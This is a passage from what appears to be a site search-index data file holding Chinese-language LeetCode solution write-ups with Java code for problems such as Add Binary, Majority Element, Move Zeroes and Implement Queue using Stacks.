\u5982\u679C\u7EDF\u8BA1\u7684\u662F N! \u7684\u4E8C\u8FDB\u5236\u8868\u793A\u4E2D\u6700\u4F4E\u4F4D 1 \u7684\u4F4D\u7F6E\uFF0C\u53EA\u8981\u7EDF\u8BA1\u6709\u591A\u5C11\u4E2A 2 \u5373\u53EF\uFF0C\u8BE5\u9898\u76EE\u51FA\u81EA \u7F16\u7A0B\u4E4B\u7F8E\uFF1A2.2 \u3002\u548C\u6C42\u89E3\u6709\u591A\u5C11\u4E2A 5 \u4E00\u6837\uFF0C2 \u7684\u4E2A\u6570\u4E3A N/2 + N/22 + N/23 + ...`},{header:"\u5B57\u7B26\u4E32\u52A0\u6CD5\u51CF\u6CD5",slug:"\u5B57\u7B26\u4E32\u52A0\u6CD5\u51CF\u6CD5",content:""},{header:"1. \u4E8C\u8FDB\u5236\u52A0\u6CD5",slug:"_1-\u4E8C\u8FDB\u5236\u52A0\u6CD5",content:`67. Add Binary (Easy)
Leetcode / \u529B\u6263
a = "11"
b = "1"
Return "100".
public String addBinary(String a, String b) { int i = a.length() - 1, j = b.length() - 1, carry = 0; StringBuilder str = new StringBuilder(); while (carry == 1 || i >= 0 || j >= 0) { if (i >= 0 && a.charAt(i--) == '1') { carry++; } if (j >= 0 && b.charAt(j--) == '1') { carry++; } str.append(carry % 2); carry /= 2; } return str.reverse().toString();
}`},{header:"2. \u5B57\u7B26\u4E32\u52A0\u6CD5",slug:"_2-\u5B57\u7B26\u4E32\u52A0\u6CD5",content:`415. Add Strings (Easy)
Leetcode / \u529B\u6263
\u5B57\u7B26\u4E32\u7684\u503C\u4E3A\u975E\u8D1F\u6574\u6570\u3002
public String addStrings(String num1, String num2) { StringBuilder str = new StringBuilder(); int carry = 0, i = num1.length() - 1, j = num2.length() - 1; while (carry == 1 || i >= 0 || j >= 0) { int x = i < 0 ? 0 : num1.charAt(i--) - '0'; int y = j < 0 ? 0 : num2.charAt(j--) - '0'; str.append((x + y + carry) % 10); carry = (x + y + carry) / 10; } return str.reverse().toString();
}`},{header:"\u76F8\u9047\u95EE\u9898",slug:"\u76F8\u9047\u95EE\u9898",content:""},{header:"1. \u6539\u53D8\u6570\u7EC4\u5143\u7D20\u4F7F\u6240\u6709\u7684\u6570\u7EC4\u5143\u7D20\u90FD\u76F8\u7B49",slug:"_1-\u6539\u53D8\u6570\u7EC4\u5143\u7D20\u4F7F\u6240\u6709\u7684\u6570\u7EC4\u5143\u7D20\u90FD\u76F8\u7B49",content:`462. Minimum Moves to Equal Array Elements II (Medium)
Leetcode / \u529B\u6263
Input:
[1,2,3] Output:
2 Explanation:
Only two moves are needed (remember each move increments or decrements one element): [1,2,3] => [2,2,3] => [2,2,2]
\u6BCF\u6B21\u53EF\u4EE5\u5BF9\u4E00\u4E2A\u6570\u7EC4\u5143\u7D20\u52A0\u4E00\u6216\u8005\u51CF\u4E00\uFF0C\u6C42\u6700\u5C0F\u7684\u6539\u53D8\u6B21\u6570\u3002
\u8FD9\u662F\u4E2A\u5178\u578B\u7684\u76F8\u9047\u95EE\u9898\uFF0C\u79FB\u52A8\u8DDD\u79BB\u6700\u5C0F\u7684\u65B9\u5F0F\u662F\u6240\u6709\u5143\u7D20\u90FD\u79FB\u52A8\u5230\u4E2D\u4F4D\u6570\u3002\u7406\u7531\u5982\u4E0B\uFF1A
\u8BBE m \u4E3A\u4E2D\u4F4D\u6570\u3002a \u548C b \u662F m \u4E24\u8FB9\u7684\u4E24\u4E2A\u5143\u7D20\uFF0C\u4E14 b > a\u3002\u8981\u4F7F a \u548C b \u76F8\u7B49\uFF0C\u5B83\u4EEC\u603B\u5171\u79FB\u52A8\u7684\u6B21\u6570\u4E3A b - a\uFF0C\u8FD9\u4E2A\u503C\u7B49\u4E8E (b - m) + (m - a)\uFF0C\u4E5F\u5C31\u662F\u628A\u8FD9\u4E24\u4E2A\u6570\u79FB\u52A8\u5230\u4E2D\u4F4D\u6570\u7684\u79FB\u52A8\u6B21\u6570\u3002
\u8BBE\u6570\u7EC4\u957F\u5EA6\u4E3A N\uFF0C\u5219\u53EF\u4EE5\u627E\u5230 N/2 \u5BF9 a \u548C b \u7684\u7EC4\u5408\uFF0C\u4F7F\u5B83\u4EEC\u90FD\u79FB\u52A8\u5230 m \u7684\u4F4D\u7F6E\u3002
\u89E3\u6CD5 1
\u5148\u6392\u5E8F\uFF0C\u65F6\u95F4\u590D\u6742\u5EA6\uFF1AO(NlogN)
public int minMoves2(int[] nums) { Arrays.sort(nums); int move = 0; int l = 0, h = nums.length - 1; while (l <= h) { move += nums[h] - nums[l]; l++; h--; } return move;
}
\u89E3\u6CD5 2
\u4F7F\u7528\u5FEB\u901F\u9009\u62E9\u627E\u5230\u4E2D\u4F4D\u6570\uFF0C\u65F6\u95F4\u590D\u6742\u5EA6 O(N)
public int minMoves2(int[] nums) { int move = 0; int median = findKthSmallest(nums, nums.length / 2); for (int num : nums) { move += Math.abs(num - median); } return move;
} private int findKthSmallest(int[] nums, int k) { int l = 0, h = nums.length - 1; while (l < h) { int j = partition(nums, l, h); if (j == k) { break; } if (j < k) { l = j + 1; } else { h = j - 1; } } return nums[k];
} private int partition(int[] nums, int l, int h) { int i = l, j = h + 1; while (true) { while (nums[++i] < nums[l] && i < h) ; while (nums[--j] > nums[l] && j > l) ; if (i >= j) { break; } swap(nums, i, j); } swap(nums, l, j); return j;
} private void swap(int[] nums, int i, int j) { int tmp = nums[i]; nums[i] = nums[j]; nums[j] = tmp;
}`},{header:"\u591A\u6570\u6295\u7968\u95EE\u9898",slug:"\u591A\u6570\u6295\u7968\u95EE\u9898",content:""},{header:"1. \u6570\u7EC4\u4E2D\u51FA\u73B0\u6B21\u6570\u591A\u4E8E n / 2 \u7684\u5143\u7D20",slug:"_1-\u6570\u7EC4\u4E2D\u51FA\u73B0\u6B21\u6570\u591A\u4E8E-n-2-\u7684\u5143\u7D20",content:`169. Majority Element (Easy)
Leetcode / \u529B\u6263
\u5148\u5BF9\u6570\u7EC4\u6392\u5E8F\uFF0C\u6700\u4E2D\u95F4\u90A3\u4E2A\u6570\u51FA\u73B0\u6B21\u6570\u4E00\u5B9A\u591A\u4E8E n / 2\u3002
public int majorityElement(int[] nums) { Arrays.sort(nums); return nums[nums.length / 2];
}
\u53EF\u4EE5\u5229\u7528 Boyer-Moore Majority Vote Algorithm \u6765\u89E3\u51B3\u8FD9\u4E2A\u95EE\u9898\uFF0C\u4F7F\u5F97\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\u3002\u53EF\u4EE5\u8FD9\u4E48\u7406\u89E3\u8BE5\u7B97\u6CD5\uFF1A\u4F7F\u7528 cnt \u6765\u7EDF\u8BA1\u4E00\u4E2A\u5143\u7D20\u51FA\u73B0\u7684\u6B21\u6570\uFF0C\u5F53\u904D\u5386\u5230\u7684\u5143\u7D20\u548C\u7EDF\u8BA1\u5143\u7D20\u4E0D\u76F8\u7B49\u65F6\uFF0C\u4EE4 cnt--\u3002\u5982\u679C\u524D\u9762\u67E5\u627E\u4E86 i \u4E2A\u5143\u7D20\uFF0C\u4E14 cnt == 0\uFF0C\u8BF4\u660E\u524D i \u4E2A\u5143\u7D20\u6CA1\u6709 majority\uFF0C\u6216\u8005\u6709 majority\uFF0C\u4F46\u662F\u51FA\u73B0\u7684\u6B21\u6570\u5C11\u4E8E i / 2\uFF0C\u56E0\u4E3A\u5982\u679C\u591A\u4E8E i / 2 \u7684\u8BDD cnt \u5C31\u4E00\u5B9A\u4E0D\u4F1A\u4E3A 0\u3002\u6B64\u65F6\u5269\u4E0B\u7684 n - i \u4E2A\u5143\u7D20\u4E2D\uFF0Cmajority \u7684\u6570\u76EE\u4F9D\u7136\u591A\u4E8E (n - i) / 2\uFF0C\u56E0\u6B64\u7EE7\u7EED\u67E5\u627E\u5C31\u80FD\u627E\u51FA majority\u3002
public int majorityElement(int[] nums) { int cnt = 0, majority = nums[0]; for (int num : nums) { majority = (cnt == 0) ? num : majority; cnt = (majority == num) ? cnt + 1 : cnt - 1; } return majority;
}`},{header:"\u5176\u5B83",slug:"\u5176\u5B83",content:""},{header:"1. \u5E73\u65B9\u6570",slug:"_1-\u5E73\u65B9\u6570",content:`367. Valid Perfect Square (Easy)
Leetcode / \u529B\u6263
Input: 16
Returns: True
\u5E73\u65B9\u5E8F\u5217\uFF1A1,4,9,16,..
\u95F4\u9694\uFF1A3,5,7,...
\u95F4\u9694\u4E3A\u7B49\u5DEE\u6570\u5217\uFF0C\u4F7F\u7528\u8FD9\u4E2A\u7279\u6027\u53EF\u4EE5\u5F97\u5230\u4ECE 1 \u5F00\u59CB\u7684\u5E73\u65B9\u5E8F\u5217\u3002
public boolean isPerfectSquare(int num) { int subNum = 1; while (num > 0) { num -= subNum; subNum += 2; } return num == 0;
}`},{header:"2. 3 \u7684 n \u6B21\u65B9",slug:"_2-3-\u7684-n-\u6B21\u65B9",content:`326. Power of Three (Easy)
Leetcode / \u529B\u6263
public boolean isPowerOfThree(int n) { return n > 0 && (1162261467 % n == 0);
}`},{header:"3. \u4E58\u79EF\u6570\u7EC4",slug:"_3-\u4E58\u79EF\u6570\u7EC4",content:`238. Product of Array Except Self (Medium)
Leetcode / \u529B\u6263
For example, given [1,2,3,4], return [24,12,8,6].
\u7ED9\u5B9A\u4E00\u4E2A\u6570\u7EC4\uFF0C\u521B\u5EFA\u4E00\u4E2A\u65B0\u6570\u7EC4\uFF0C\u65B0\u6570\u7EC4\u7684\u6BCF\u4E2A\u5143\u7D20\u4E3A\u539F\u59CB\u6570\u7EC4\u4E2D\u9664\u4E86\u8BE5\u4F4D\u7F6E\u4E0A\u7684\u5143\u7D20\u4E4B\u5916\u6240\u6709\u5143\u7D20\u7684\u4E58\u79EF\u3002
\u8981\u6C42\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\uFF0C\u5E76\u4E14\u4E0D\u80FD\u4F7F\u7528\u9664\u6CD5\u3002
public int[] productExceptSelf(int[] nums) { int n = nums.length; int[] products = new int[n]; Arrays.fill(products, 1); int left = 1; for (int i = 1; i < n; i++) { left *= nums[i - 1]; products[i] *= left; } int right = 1; for (int i = n - 2; i >= 0; i--) { right *= nums[i + 1]; products[i] *= right; } return products;
}`},{header:"4. \u627E\u51FA\u6570\u7EC4\u4E2D\u7684\u4E58\u79EF\u6700\u5927\u7684\u4E09\u4E2A\u6570",slug:"_4-\u627E\u51FA\u6570\u7EC4\u4E2D\u7684\u4E58\u79EF\u6700\u5927\u7684\u4E09\u4E2A\u6570",content:`628. Maximum Product of Three Numbers (Easy)
Leetcode / \u529B\u6263
Input: [1,2,3,4]
Output: 24
public int maximumProduct(int[] nums) { int max1 = Integer.MIN_VALUE, max2 = Integer.MIN_VALUE, max3 = Integer.MIN_VALUE, min1 = Integer.MAX_VALUE, min2 = Integer.MAX_VALUE; for (int n : nums) { if (n > max1) { max3 = max2; max2 = max1; max1 = n; } else if (n > max2) { max3 = max2; max2 = n; } else if (n > max3) { max3 = n; } if (n < min1) { min2 = min1; min1 = n; } else if (n < min2) { min2 = n; } } return Math.max(max1*max2*max3, max1*min1*min2);
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%95%B0%E7%BB%84%E4%B8%8E%E7%9F%A9%E9%98%B5.html",title:"Leetcode \u9898\u89E3 - \u6570\u7EC4\u4E0E\u77E9\u9635",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u6570\u7EC4\u4E0E\u77E9\u9635",slug:"leetcode-\u9898\u89E3-\u6570\u7EC4\u4E0E\u77E9\u9635",content:`Leetcode \u9898\u89E3 - \u6570\u7EC4\u4E0E\u77E9\u9635 1. \u628A\u6570\u7EC4\u4E2D\u7684 0 \u79FB\u5230\u672B\u5C3E
2. \u6539\u53D8\u77E9\u9635\u7EF4\u5EA6
3. \u627E\u51FA\u6570\u7EC4\u4E2D\u6700\u957F\u7684\u8FDE\u7EED 1
4. \u6709\u5E8F\u77E9\u9635\u67E5\u627E
5. \u6709\u5E8F\u77E9\u9635\u7684 Kth Element
6. \u4E00\u4E2A\u6570\u7EC4\u5143\u7D20\u5728 [1, n] \u4E4B\u95F4\uFF0C\u5176\u4E2D\u4E00\u4E2A\u6570\u88AB\u66FF\u6362\u4E3A\u53E6\u4E00\u4E2A\u6570\uFF0C\u627E\u51FA\u91CD\u590D\u7684\u6570\u548C\u4E22\u5931\u7684\u6570
7. \u627E\u51FA\u6570\u7EC4\u4E2D\u91CD\u590D\u7684\u6570\uFF0C\u6570\u7EC4\u503C\u5728 [1, n] \u4E4B\u95F4
8. \u6570\u7EC4\u76F8\u90BB\u5DEE\u503C\u7684\u4E2A\u6570
9. \u6570\u7EC4\u7684\u5EA6
10. \u5BF9\u89D2\u5143\u7D20\u76F8\u7B49\u7684\u77E9\u9635
11. \u5D4C\u5957\u6570\u7EC4
12. \u5206\u9694\u6570\u7EC4`},{header:"1. \u628A\u6570\u7EC4\u4E2D\u7684 0 \u79FB\u5230\u672B\u5C3E",slug:"_1-\u628A\u6570\u7EC4\u4E2D\u7684-0-\u79FB\u5230\u672B\u5C3E",content:`283. Move Zeroes (Easy)
Leetcode / \u529B\u6263
For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0].
public void moveZeroes(int[] nums) { int idx = 0; for (int num : nums) { if (num != 0) { nums[idx++] = num; } } while (idx < nums.length) { nums[idx++] = 0; }
}`},{header:"2. \u6539\u53D8\u77E9\u9635\u7EF4\u5EA6",slug:"_2-\u6539\u53D8\u77E9\u9635\u7EF4\u5EA6",content:`566. Reshape the Matrix (Easy)
Leetcode / \u529B\u6263
Input:
nums =
[[1,2], [3,4]]
r = 1, c = 4 Output:
[[1,2,3,4]] Explanation:
The row-traversing of nums is [1,2,3,4]. The new reshaped matrix is a 1 * 4 matrix, fill it row by row by using the previous list.
public int[][] matrixReshape(int[][] nums, int r, int c) { int m = nums.length, n = nums[0].length; if (m * n != r * c) { return nums; } int[][] reshapedNums = new int[r][c]; int index = 0; for (int i = 0; i < r; i++) { for (int j = 0; j < c; j++) { reshapedNums[i][j] = nums[index / n][index % n]; index++; } } return reshapedNums;
}`},{header:"3. \u627E\u51FA\u6570\u7EC4\u4E2D\u6700\u957F\u7684\u8FDE\u7EED 1",slug:"_3-\u627E\u51FA\u6570\u7EC4\u4E2D\u6700\u957F\u7684\u8FDE\u7EED-1",content:`485. Max Consecutive Ones (Easy)
Leetcode / \u529B\u6263
public int findMaxConsecutiveOnes(int[] nums) { int max = 0, cur = 0; for (int x : nums) { cur = x == 0 ? 0 : cur + 1; max = Math.max(max, cur); } return max;
}`},{header:"4. \u6709\u5E8F\u77E9\u9635\u67E5\u627E",slug:"_4-\u6709\u5E8F\u77E9\u9635\u67E5\u627E",content:`240. Search a 2D Matrix II (Medium)
Leetcode / \u529B\u6263
[ [ 1, 5, 9], [10, 11, 13], [12, 13, 15]
]
public boolean searchMatrix(int[][] matrix, int target) { if (matrix == null || matrix.length == 0 || matrix[0].length == 0) return false; int m = matrix.length, n = matrix[0].length; int row = 0, col = n - 1; while (row < m && col >= 0) { if (target == matrix[row][col]) return true; else if (target < matrix[row][col]) col--; else row++; } return false;
}`},{header:"5. \u6709\u5E8F\u77E9\u9635\u7684 Kth Element",slug:"_5-\u6709\u5E8F\u77E9\u9635\u7684-kth-element",content:`378. Kth Smallest Element in a Sorted Matrix ((Medium))
Leetcode / \u529B\u6263
matrix = [ [ 1, 5, 9], [10, 11, 13], [12, 13, 15]
],
k = 8, return 13.
\u89E3\u9898\u53C2\u8003\uFF1AShare my thoughts and Clean Java Code
\u4E8C\u5206\u67E5\u627E\u89E3\u6CD5\uFF1A
public int kthSmallest(int[][] matrix, int k) { int m = matrix.length, n = matrix[0].length; int lo = matrix[0][0], hi = matrix[m - 1][n - 1]; while (lo <= hi) { int mid = lo + (hi - lo) / 2; int cnt = 0; for (int i = 0; i < m; i++) { for (int j = 0; j < n && matrix[i][j] <= mid; j++) { cnt++; } } if (cnt < k) lo = mid + 1; else hi = mid - 1; } return lo;
}
\u5806\u89E3\u6CD5\uFF1A
public int kthSmallest(int[][] matrix, int k) { int m = matrix.length, n = matrix[0].length; PriorityQueue<Tuple> pq = new PriorityQueue<Tuple>(); for(int j = 0; j < n; j++) pq.offer(new Tuple(0, j, matrix[0][j])); for(int i = 0; i < k - 1; i++) { // \u5C0F\u6839\u5806\uFF0C\u53BB\u6389 k - 1 \u4E2A\u5806\u9876\u5143\u7D20\uFF0C\u6B64\u65F6\u5806\u9876\u5143\u7D20\u5C31\u662F\u7B2C k \u7684\u6570 Tuple t = pq.poll(); if(t.x == m - 1) continue; pq.offer(new Tuple(t.x + 1, t.y, matrix[t.x + 1][t.y])); } return pq.poll().val;
} class Tuple implements Comparable<Tuple> { int x, y, val; public Tuple(int x, int y, int val) { this.x = x; this.y = y; this.val = val; } @Override public int compareTo(Tuple that) { return this.val - that.val; }
}`},{header:"6. \u4E00\u4E2A\u6570\u7EC4\u5143\u7D20\u5728 [1, n] \u4E4B\u95F4\uFF0C\u5176\u4E2D\u4E00\u4E2A\u6570\u88AB\u66FF\u6362\u4E3A\u53E6\u4E00\u4E2A\u6570\uFF0C\u627E\u51FA\u91CD\u590D\u7684\u6570\u548C\u4E22\u5931\u7684\u6570",slug:"_6-\u4E00\u4E2A\u6570\u7EC4\u5143\u7D20\u5728-1-n-\u4E4B\u95F4-\u5176\u4E2D\u4E00\u4E2A\u6570\u88AB\u66FF\u6362\u4E3A\u53E6\u4E00\u4E2A\u6570-\u627E\u51FA\u91CD\u590D\u7684\u6570\u548C\u4E22\u5931\u7684\u6570",content:`645. Set Mismatch (Easy)
Leetcode / \u529B\u6263
Input: nums = [1,2,2,4]
Output: [2,3]
Input: nums = [1,2,2,4]
Output: [2,3]
\u6700\u76F4\u63A5\u7684\u65B9\u6CD5\u662F\u5148\u5BF9\u6570\u7EC4\u8FDB\u884C\u6392\u5E8F\uFF0C\u8FD9\u79CD\u65B9\u6CD5\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(NlogN)\u3002\u672C\u9898\u53EF\u4EE5\u4EE5 O(N) \u7684\u65F6\u95F4\u590D\u6742\u5EA6\u3001O(1) \u7A7A\u95F4\u590D\u6742\u5EA6\u6765\u6C42\u89E3\u3002
\u4E3B\u8981\u601D\u60F3\u662F\u901A\u8FC7\u4EA4\u6362\u6570\u7EC4\u5143\u7D20\uFF0C\u4F7F\u5F97\u6570\u7EC4\u4E0A\u7684\u5143\u7D20\u5728\u6B63\u786E\u7684\u4F4D\u7F6E\u4E0A\u3002
public int[] findErrorNums(int[] nums) { for (int i = 0; i < nums.length; i++) { while (nums[i] != i + 1 && nums[nums[i] - 1] != nums[i]) { swap(nums, i, nums[i] - 1); } } for (int i = 0; i < nums.length; i++) { if (nums[i] != i + 1) { return new int[]{nums[i], i + 1}; } } return null;
} private void swap(int[] nums, int i, int j) { int tmp = nums[i]; nums[i] = nums[j]; nums[j] = tmp;
}`},{header:"7. \u627E\u51FA\u6570\u7EC4\u4E2D\u91CD\u590D\u7684\u6570\uFF0C\u6570\u7EC4\u503C\u5728 [1, n] \u4E4B\u95F4",slug:"_7-\u627E\u51FA\u6570\u7EC4\u4E2D\u91CD\u590D\u7684\u6570-\u6570\u7EC4\u503C\u5728-1-n-\u4E4B\u95F4",content:`287. Find the Duplicate Number (Medium)
Leetcode / \u529B\u6263
\u8981\u6C42\u4E0D\u80FD\u4FEE\u6539\u6570\u7EC4\uFF0C\u4E5F\u4E0D\u80FD\u4F7F\u7528\u989D\u5916\u7684\u7A7A\u95F4\u3002
\u4E8C\u5206\u67E5\u627E\u89E3\u6CD5\uFF1A
public int findDuplicate(int[] nums) { int l = 1, h = nums.length - 1; while (l <= h) { int mid = l + (h - l) / 2; int cnt = 0; for (int i = 0; i < nums.length; i++) { if (nums[i] <= mid) cnt++; } if (cnt > mid) h = mid - 1; else l = mid + 1; } return l;
}
\u53CC\u6307\u9488\u89E3\u6CD5\uFF0C\u7C7B\u4F3C\u4E8E\u6709\u73AF\u94FE\u8868\u4E2D\u627E\u51FA\u73AF\u7684\u5165\u53E3\uFF1A
public int findDuplicate(int[] nums) { int slow = nums[0], fast = nums[nums[0]]; while (slow != fast) { slow = nums[slow]; fast = nums[nums[fast]]; } fast = 0; while (slow != fast) { slow = nums[slow]; fast = nums[fast]; } return slow;
}`},{header:"8. \u6570\u7EC4\u76F8\u90BB\u5DEE\u503C\u7684\u4E2A\u6570",slug:"_8-\u6570\u7EC4\u76F8\u90BB\u5DEE\u503C\u7684\u4E2A\u6570",content:`667. Beautiful Arrangement II (Medium)
Leetcode / \u529B\u6263
Input: n = 3, k = 2
Output: [1, 3, 2]
Explanation: The [1, 3, 2] has three different positive integers ranging from 1 to 3, and the [2, 1] has exactly 2 distinct integers: 1 and 2.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u6570\u7EC4\u5143\u7D20\u4E3A 1~n \u7684\u6574\u6570\uFF0C\u8981\u6C42\u6784\u5EFA\u6570\u7EC4\uFF0C\u4F7F\u5F97\u76F8\u90BB\u5143\u7D20\u7684\u5DEE\u503C\u4E0D\u76F8\u540C\u7684\u4E2A\u6570\u4E3A k\u3002
\u8BA9\u524D k+1 \u4E2A\u5143\u7D20\u6784\u5EFA\u51FA k \u4E2A\u4E0D\u76F8\u540C\u7684\u5DEE\u503C\uFF0C\u5E8F\u5217\u4E3A\uFF1A1 k+1 2 k 3 k-1 ... k/2 k/2+1.
public int[] constructArray(int n, int k) { int[] ret = new int[n]; ret[0] = 1; for (int i = 1, interval = k; i <= k; i++, interval--) { ret[i] = i % 2 == 1 ? ret[i - 1] + interval : ret[i - 1] - interval; } for (int i = k + 1; i < n; i++) { ret[i] = i + 1; } return ret;
}`},{header:"9. \u6570\u7EC4\u7684\u5EA6",slug:"_9-\u6570\u7EC4\u7684\u5EA6",content:`697. Degree of an Array (Easy)
Leetcode / \u529B\u6263
Input: [1,2,2,3,1,4,2]
Output: 6
\u9898\u76EE\u63CF\u8FF0\uFF1A\u6570\u7EC4\u7684\u5EA6\u5B9A\u4E49\u4E3A\u5143\u7D20\u51FA\u73B0\u7684\u6700\u9AD8\u9891\u7387\uFF0C\u4F8B\u5982\u4E0A\u9762\u7684\u6570\u7EC4\u5EA6\u4E3A 3\u3002\u8981\u6C42\u627E\u5230\u4E00\u4E2A\u6700\u5C0F\u7684\u5B50\u6570\u7EC4\uFF0C\u8FD9\u4E2A\u5B50\u6570\u7EC4\u7684\u5EA6\u548C\u539F\u6570\u7EC4\u4E00\u6837\u3002
public int findShortestSubArray(int[] nums) { Map<Integer, Integer> numsCnt = new HashMap<>(); Map<Integer, Integer> numsLastIndex = new HashMap<>(); Map<Integer, Integer> numsFirstIndex = new HashMap<>(); for (int i = 0; i < nums.length; i++) { int num = nums[i]; numsCnt.put(num, numsCnt.getOrDefault(num, 0) + 1); numsLastIndex.put(num, i); if (!numsFirstIndex.containsKey(num)) { numsFirstIndex.put(num, i); } } int maxCnt = 0; for (int num : nums) { maxCnt = Math.max(maxCnt, numsCnt.get(num)); } int ret = nums.length; for (int i = 0; i < nums.length; i++) { int num = nums[i]; int cnt = numsCnt.get(num); if (cnt != maxCnt) continue; ret = Math.min(ret, numsLastIndex.get(num) - numsFirstIndex.get(num) + 1); } return ret;
}`},{header:"10. \u5BF9\u89D2\u5143\u7D20\u76F8\u7B49\u7684\u77E9\u9635",slug:"_10-\u5BF9\u89D2\u5143\u7D20\u76F8\u7B49\u7684\u77E9\u9635",content:`766. Toeplitz Matrix (Easy)
Leetcode / \u529B\u6263
1234
5123
9512 In the above grid, the diagonals are "[9]", "[5, 5]", "[1, 1, 1]", "[2, 2, 2]", "[3, 3]", "[4]", and in each diagonal all elements are the same, so the answer is True.
public boolean isToeplitzMatrix(int[][] matrix) { for (int i = 0; i < matrix[0].length; i++) { if (!check(matrix, matrix[0][i], 0, i)) { return false; } } for (int i = 0; i < matrix.length; i++) { if (!check(matrix, matrix[i][0], i, 0)) { return false; } } return true;
} private boolean check(int[][] matrix, int expectValue, int row, int col) { if (row >= matrix.length || col >= matrix[0].length) { return true; } if (matrix[row][col] != expectValue) { return false; } return check(matrix, expectValue, row + 1, col + 1);
}`},{header:"11. \u5D4C\u5957\u6570\u7EC4",slug:"_11-\u5D4C\u5957\u6570\u7EC4",content:`565. Array Nesting (Medium)
Leetcode / \u529B\u6263
Input: A = [5,4,0,3,1,6,2]
Output: 4
Explanation:
A[0] = 5, A[1] = 4, A[2] = 0, A[3] = 3, A[4] = 1, A[5] = 6, A[6] = 2. One of the longest S[K]:
S[0] = {A[0], A[5], A[6], A[2]} = {5, 6, 2, 0}
\u9898\u76EE\u63CF\u8FF0\uFF1AS[i] \u8868\u793A\u4E00\u4E2A\u96C6\u5408\uFF0C\u96C6\u5408\u7684\u7B2C\u4E00\u4E2A\u5143\u7D20\u662F A[i]\uFF0C\u7B2C\u4E8C\u4E2A\u5143\u7D20\u662F A[A[i]]\uFF0C\u5982\u6B64\u5D4C\u5957\u4E0B\u53BB\u3002\u6C42\u6700\u5927\u7684 S[i]\u3002
public int arrayNesting(int[] nums) { int max = 0; for (int i = 0; i < nums.length; i++) { int cnt = 0; for (int j = i; nums[j] != -1; ) { cnt++; int t = nums[j]; nums[j] = -1; // \u6807\u8BB0\u8BE5\u4F4D\u7F6E\u5DF2\u7ECF\u88AB\u8BBF\u95EE j = t; } max = Math.max(max, cnt); } return max;
}`},{header:"12. \u5206\u9694\u6570\u7EC4",slug:"_12-\u5206\u9694\u6570\u7EC4",content:`769. Max Chunks To Make Sorted (Medium)
Leetcode / \u529B\u6263
Input: arr = [1,0,2,3,4]
Output: 4
Explanation:
We can split into two chunks, such as [1, 0], [2, 3, 4].
However, splitting into [1, 0], [2], [3], [4] is the highest number of chunks possible.
\u9898\u76EE\u63CF\u8FF0\uFF1A\u5206\u9694\u6570\u7EC4\uFF0C\u4F7F\u5F97\u5BF9\u6BCF\u90E8\u5206\u6392\u5E8F\u540E\u6570\u7EC4\u5C31\u4E3A\u6709\u5E8F\u3002
public int maxChunksToSorted(int[] arr) { if (arr == null) return 0; int ret = 0; int right = arr[0]; for (int i = 0; i < arr.length; i++) { right = Math.max(right, arr[i]); if (right == i) ret++; } return ret;
}`}]},{path:"/leetcode/Leetcode%20%E9%A2%98%E8%A7%A3%20-%20%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97.html",title:"Leetcode \u9898\u89E3 - \u6808\u548C\u961F\u5217",pathLocale:"/",contents:[{header:"Leetcode \u9898\u89E3 - \u6808\u548C\u961F\u5217",slug:"leetcode-\u9898\u89E3-\u6808\u548C\u961F\u5217",content:`Leetcode \u9898\u89E3 - \u6808\u548C\u961F\u5217 1. \u7528\u6808\u5B9E\u73B0\u961F\u5217
2. \u7528\u961F\u5217\u5B9E\u73B0\u6808
3. \u6700\u5C0F\u503C\u6808
4. \u7528\u6808\u5B9E\u73B0\u62EC\u53F7\u5339\u914D
5. \u6570\u7EC4\u4E2D\u5143\u7D20\u4E0E\u4E0B\u4E00\u4E2A\u6BD4\u5B83\u5927\u7684\u5143\u7D20\u4E4B\u95F4\u7684\u8DDD\u79BB
6. \u5FAA\u73AF\u6570\u7EC4\u4E2D\u6BD4\u5F53\u524D\u5143\u7D20\u5927\u7684\u4E0B\u4E00\u4E2A\u5143\u7D20`},{header:"1. \u7528\u6808\u5B9E\u73B0\u961F\u5217",slug:"_1-\u7528\u6808\u5B9E\u73B0\u961F\u5217",content:`232. Implement Queue using Stacks (Easy)
Leetcode / \u529B\u6263
\u6808\u7684\u987A\u5E8F\u4E3A\u540E\u8FDB\u5148\u51FA\uFF0C\u800C\u961F\u5217\u7684\u987A\u5E8F\u4E3A\u5148\u8FDB\u5148\u51FA\u3002\u4F7F\u7528\u4E24\u4E2A\u6808\u5B9E\u73B0\u961F\u5217\uFF0C\u4E00\u4E2A\u5143\u7D20\u9700\u8981\u7ECF\u8FC7\u4E24\u4E2A\u6808\u624D\u80FD\u51FA\u961F\u5217\uFF0C\u5728\u7ECF\u8FC7\u7B2C\u4E00\u4E2A\u6808\u65F6\u5143\u7D20\u987A\u5E8F\u88AB\u53CD\u8F6C\uFF0C\u7ECF\u8FC7\u7B2C\u4E8C\u4E2A\u6808\u65F6\u518D\u6B21\u88AB\u53CD\u8F6C\uFF0C\u6B64\u65F6\u5C31\u662F\u5148\u8FDB\u5148\u51FA\u987A\u5E8F\u3002
class MyQueue { private Stack<Integer> in = new Stack<>(); private Stack<Integer> out = new Stack<>(); public void push(int x) { in.push(x); } public int pop() { in2out(); return out.pop(); } public int peek() { in2out(); return out.peek(); } private void in2out() { if (out.isEmpty()) { while (!in.isEmpty()) { out.push(in.pop()); } } } public boolean empty() { return in.isEmpty() && out.isEmpty(); }
}`},{header:"2. \u7528\u961F\u5217\u5B9E\u73B0\u6808",slug:"_2-\u7528\u961F\u5217\u5B9E\u73B0\u6808",content:`225. Implement Stack using Queues (Easy)
Leetcode / \u529B\u6263
